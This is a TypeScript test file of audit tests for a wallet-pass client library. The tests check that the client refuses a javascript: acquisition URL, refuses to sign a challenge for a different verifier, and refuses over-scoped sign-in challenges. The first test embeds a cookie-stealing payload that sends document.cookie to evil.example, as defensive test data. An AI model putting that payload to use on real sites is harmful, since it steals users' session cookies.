import { describe, expect, it } from "vitest";
import { getAddress } from "viem";
import { createSiweMessage } from "viem/siwe";
import { assetId, buildChallenge, generateNonce, readProofHeaders, tokenRef } from "@erc8426/core";
import { checkChallengeScope, createWalletPassClient, domainsForUrl } from "@erc8426/client";

import { fakeChain } from "../../packages/client/test/fixtures.js";
import { newSigner } from "../../packages/issuer/test/helpers.js";

const CONTRACT = getAddress("0x5F9B5a1cdED9d6B3f5E8a2C47B0e13d6A8F4c2e1");
const WALLET_PASS_ID = "0xef5f1e71";

function clientFor(passUri: string, fetchImpl: typeof fetch) {
  const chain = fakeChain({ contracts: { [CONTRACT]: { interfaces: [WALLET_PASS_ID], passURI: () => passUri } } });
  return createWalletPassClient({ publicClient: chain.client, fetch: fetchImpl });
}

describe("AUDIT client: manifest URL schemes", () => {
  it("refuses a javascript: acquisition URL instead of handing it to window.location.assign", async () => {
    const fetchImpl = (async () =>
      Response.json({ formats: { apple: "javascript:fetch('https://evil.example/?c='+document.cookie)//" } })) as unknown as typeof fetch;
    const client = clientFor("https://issuer.example/wallet-pass/1", fetchImpl);
    let outcome: string;
    try {
      const r = await client.addToWallet({ contract: CONTRACT, tokenId: 1n }, { platform: "apple" });
      outcome = `navigates to ${r.url}`;
    } catch (e) {
      outcome = `refused: ${(e as Error).message}`;
    }
    expect(outcome.startsWith("refused")).toBe(true);
  });
});

describe("AUDIT client: verifier identity vs where the proof is sent", () => {
  it("does not sign a challenge naming a verifier other than the host the proof will be presented to", async () => {
    const owner = newSigner();
    const token = tokenRef(1, CONTRACT, 1n);
    const sentTo: string[] = [];
    let signed = false;
    const fetchImpl = (async (input: string | URL, init: RequestInit = {}) => {
      const url = new URL(String(input));
      const headers = new Headers(init.headers);
      if (url.host === "a.example" && readProofHeaders(headers).kind === "present") {
        sentTo.push(url.host);
        return Response.json({ formats: { apple: "https://a.example/p.pkpass" } });
      }
      if (url.host === "a.example") {
        // The passURI host points the client at another verifier.
        return Response.json({ error: "proof_required", challenge: "https://b.example/wallet-pass/1/challenge" }, { status: 401 });
      }
      if (url.host === "b.example") {
        const now = new Date();
        return Response.json({
          message: buildChallenge({
            domain: "b.example",
            uri: "https://b.example/wallet-pass/actions",
            account: owner.address,
            token,
            action: "acquire",
            nonce: generateNonce(),
            issuedAt: now,
            expirationTime: new Date(now.getTime() + 300_000),
          }),
        });
      }
      return new Response(null, { status: 404 });
    }) as unknown as typeof fetch;
    const client = clientFor("https://a.example/wallet-pass/1", fetchImpl);
    const signer = {
      address: owner.address,
      signMessage: async (a: { message: string }) => {
        signed = true;
        return owner.signMessage(a);
      },
    };
    try {
      await client.getManifest({ contract: CONTRACT, tokenId: 1n }, { signer });
    } catch {
      // refusal is the expected outcome
    }
    // A proof valid at b.example was signed and handed to a.example.
    expect({ signed, sentTo }).toEqual({ signed: false, sentTo: [] });
  });
});

describe("AUDIT client: challenge scope is not exact", () => {
  it("refuses a challenge that carries resources beyond the token and the action", () => {
    const owner = newSigner();
    const token = tokenRef(1, CONTRACT, 1n);
    const now = new Date();
    const message = createSiweMessage({
      domain: "issuer.example",
      address: owner.address,
      statement: "Authorize the acquire action for wallet pass token 1 on issuer.example.",
      uri: "https://issuer.example/wallet-pass/actions",
      version: "1",
      chainId: 1,
      nonce: generateNonce(),
      issuedAt: now,
      expirationTime: new Date(now.getTime() + 60_000),
      resources: [
        assetId(token),
        "urn:wallet-pass:action:acquire",
        // An EIP-5573 ReCap granting the issuer extra capabilities.
        "urn:recap:eyJhdHQiOnsiaHR0cHM6Ly9leGFtcGxlLmNvbSI6eyIqLyoiOlt7fV19fX0",
      ],
    });
    const r = checkChallengeScope(message, { token, action: "acquire", account: owner.address, domains: ["issuer.example"] });
    expect(r.ok).toBe(false);
  });

  it("does not accept the port-less host for a challenge served from a non-default port", () => {
    expect(domainsForUrl("https://issuer.example:8443/wallet-pass/1/challenge")).not.toContain("issuer.example");
  });
});
